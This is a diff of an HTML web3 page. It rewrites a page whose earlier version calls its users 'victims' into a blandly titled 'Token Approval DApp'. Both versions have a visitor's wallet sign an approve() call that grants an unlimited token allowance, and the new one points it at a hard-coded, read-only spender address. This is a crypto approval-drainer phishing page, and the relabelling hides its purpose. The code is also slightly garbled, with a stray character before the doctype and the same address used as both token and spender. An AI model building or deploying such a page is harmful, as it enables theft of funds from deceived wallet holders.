@@ -1,90 +1,78 @@
-<!DOCTYPE html>
+a<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>DApp untuk Korban Berinteraksi dengan Smart Contract</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Approval DApp</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
+    <h1>Token Approval DApp</h1>
+    <div>
+        <label for="spender">Spender Address (Contract Address):</label>
+        <input type="text" id="spender" value="0x8816e4c39472B5Ce851fB8cB271de419bF638f43" readonly>
+    </div>
+    <div>
+        <button onclick="approveAllTokens()">Approve All Tokens</button>
+    </div>
+    <div id="status"></div>
 
-<h1>Interact with Smart Contract as Victim</h1>
-
-<!-- Connect Wallet Button -->
-<button id="connectWallet">Connect Wallet</button>
-
-<!-- Approve All Tokens -->
-<h2>Approve All Tokens</h2>
-<div id="approveAllInfo" style="display: none;">
-  <p>Your connected wallet: <span id="walletAddress"></span></p>
-  <button id="approveAllButton" type="submit">Approve All Tokens</button>
-</div>
-
-<script>
-  // Initialize ethers.js
-  let provider, contract, signer;
-
-  const contractAddress = '0x8816e4c39472B5Ce851fB8cB271de419bF638f43';
-  const contractABI = [
-    {
-      "inputs": [
-        {
-          "internalType": "address",
-          "name": "spender",
-          "type": "address"
-        },
-        {
-          "internalType": "uint256",
-          "name": "amount",
-          "type": "uint256"
+    <script>
+        let web3;
+        const contractAddress = '0x8816e4c39472B5Ce851fB8cB271de419bF638f43';
+        
+        async function initWeb3() {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+                try {
+                    // Request account access
+                    await window.ethereum.enable();
+                    document.getElementById('status').innerText = "Web3 Connected!";
+                } catch (error) {
+                    document.getElementById('status').innerText = "User denied account access";
+                }
+            } else if (window.web3) {
+                web3 = new Web3(web3.currentProvider);
+                document.getElementById('status').innerText = "Web3 Detected!";
+            } else {
+                document.getElementById('status').innerText = "Please install MetaMask!";
+            }
         }
-      ],
-      "name": "approve",
-      "outputs": [
-        {
-          "internalType": "bool",
-          "name": "",
-          "type": "bool"
+
+        async function approveAllTokens() {
+            if (!web3) {
+                document.getElementById('status').innerText = "Please connect to Web3 first.";
+                return;
+            }
+
+            const tokenContract = new web3.eth.Contract(ABI, contractAddress);
+            const accounts = await web3.eth.getAccounts();
+            const spender = document.getElementById('spender').value;
+
+            try {
+                await tokenContract.methods.approve(spender, web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({from: accounts[0]});
+                document.getElementById('status').innerText = "Approval successful!";
+            } catch (error) {
+                document.getElementById('status').innerText = "Error: " + error.message;
+            }
         }
-      ],
-      "stateMutability": "nonpayable",
-      "type": "function"
-    }
-  ];
 
-  // Function to connect wallet
-  async function connectWallet() {
-    if (window.ethereum) {
-      try {
-        await ethereum.request({ method: 'eth_requestAccounts' });
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
-        contract = new ethers.Contract(contractAddress, contractABI, signer);
+        // Initialize web3 on page load
+        window.onload = initWeb3;
 
-        // Menampilkan alamat wallet yang terhubung
-        document.getElementById('walletAddress').innerText = await signer.getAddress();
-        document.getElementById('approveAllInfo').style.display = 'block';
-      } catch (err) {
-        console.error(err);
-      }
-    } else {
-      console.log('MetaMask not installed');
-    }
-  }
-
-  // Approve All Tokens
-  document.getElementById('approveAllButton').addEventListener('click', async () => {
-    try {
-      const tx = await contract.approve(await signer.getAddress(), ethers.constants.MaxUint256);  // Approve all tokens
-      console.log('Transaction successful:', tx);
-    } catch (err) {
-      console.error(err);
-    }
-  });
-
-  // Connect Wallet Button
-  document.getElementById('connectWallet').addEventListener('click', connectWallet);
-</script>
-
+        // ABI from your provided code
+        const ABI = [
+            {
+                "inputs": [
+                    {"internalType": "address", "name": "spender", "type": "address"},
+                    {"internalType": "uint256", "name": "amount", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+    </script>
 </body>
 </html>
